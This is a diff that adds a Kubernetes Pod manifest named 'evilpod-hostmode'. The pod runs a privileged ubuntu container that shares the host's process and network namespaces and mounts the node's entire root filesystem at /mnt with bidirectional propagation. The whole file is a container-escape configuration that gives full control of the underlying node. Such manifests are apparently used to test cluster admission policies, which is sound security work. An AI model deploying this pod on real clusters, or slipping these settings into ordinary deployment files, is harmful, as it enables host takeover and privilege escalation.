@@ -1,0 +1,21 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: "evilpod-hostmode"
+spec:
+  hostPID: true
+  hostNetwork: true
+  containers:
+  - name: "evilpod-hostmode"
+    image: "ubuntu"
+    command: ["sleep","infinity"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: "/mnt"
+      name: hostvolume
+      mountPropagation: Bidirectional
+  volumes:
+  - name: hostvolume
+    hostPath:
+      path: "/"
